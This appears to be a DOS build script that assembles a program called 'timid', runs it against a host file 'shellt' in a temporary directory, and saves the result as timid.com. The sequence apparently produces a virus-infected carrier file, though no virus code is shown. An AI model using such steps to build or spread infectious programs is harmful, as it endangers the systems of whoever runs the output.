   md timid
   masm timid,,;
   link timid,,;
   debug timid.exe <maket_m.dbg
   masm shellt,,;
   link shellt,,;
   exe2bin shellt shellt.com
   copy shellt.com timid
   copy timid.com timid
   cd timid
   timid
   del timid.com
   copy shellt.com ..\timid.com
   del shellt.com
   cd ..
   rd timid
   del *.obj
   del *.lst
   del *.map
   del shellt.com
   del timid.exe
   del shellt.exe
